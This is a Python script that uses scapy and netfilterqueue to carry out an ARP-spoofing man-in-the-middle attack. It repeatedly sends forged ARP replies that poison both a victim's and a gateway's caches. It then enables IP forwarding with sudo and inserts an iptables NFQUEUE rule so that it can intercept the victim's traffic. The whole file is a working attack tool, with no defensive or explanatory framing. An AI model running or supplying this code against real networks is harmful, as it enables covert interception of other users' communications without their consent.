from scapy.all import * 
import time
import os
from netfilterqueue import NetfilterQueue
from threading import Thread

def process_packet(packet):
    print("[+] Packet intercepted...")
    # Accept packet
    packet.accept()

def arp_spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface):
    while True:
        #telling the victim that we are the gateway
        arpVictim = Ether()/ARP()
        arpVictim[Ether].src = macAttacker
        arpVictim[ARP].hwsrc = macAttacker
        arpVictim[ARP].psrc = ipGateway
        arpVictim[ARP].hwdst = macVictim
        arpVictim[ARP].pdst = ipVictim

        #telling the gateway that we are the victim
        arpGateway = Ether()/ARP()
        arpGateway[Ether].src = macAttacker
        arpGateway[ARP].hwsrc = macAttacker
        arpGateway[ARP].psrc = ipVictim
        arpGateway[ARP].hwdst = macGateway
        arpGateway[ARP].pdst = ipGateway

        sendp(arpVictim, iface=interface)
        sendp(arpGateway, iface=interface)

        time.sleep(2)

def gateway_spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface):
    # Enable IP forwarding
    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
    # Set up iptables rule
    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")

    # Start ARP spoofing in a new thread
    arp_spoof_thread = Thread(target=arp_spoof, args=(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface))
    arp_spoof_thread.start()

    # Set up packet queue
    queue = NetfilterQueue()
    queue.bind(0, process_packet)

    try:
        print("[+] Starting packet interception...")
        queue.run()
    except KeyboardInterrupt:
        print("\n[-] Stopping packet interception...")
        queue.unbind()

def spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface):
    gateway_spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface)
